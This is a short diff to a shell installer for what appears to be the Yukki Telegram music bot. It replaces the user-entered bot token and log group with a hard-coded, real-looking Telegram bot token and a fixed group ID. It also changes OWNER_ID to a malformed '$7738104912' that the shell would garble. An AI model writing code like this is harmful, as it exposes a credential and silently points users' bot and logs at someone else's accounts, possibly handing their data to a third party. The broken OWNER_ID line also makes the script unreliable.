@@ -125,12 +125,12 @@ fi
 
 echo """API_ID = $api_id
 API_HASH = $api_hash
-BOT_TOKEN = $bot_token
+BOT_TOKEN = 8457129439:AAHSDblhTHuD7YwAJe6HFH26Jjha6ToWWj4
 MONGO_DB_URI = $mongo_db
-LOG_GROUP_ID = $logger
+LOG_GROUP_ID = -1003172864607
 MUSIC_BOT_NAME = $mbt
 STRING_SESSION = $string_session
-OWNER_ID = $ownid""" > .env
+OWNER_ID = $7738104912""" > .env
 clear
 pprint "\n\n\nYour Vars have been saved Successfully!, Thanks for using Yukki Installer, now you can proceed by starting the bot with bash start!"
 pprint "\n\n\nWant more vars?"
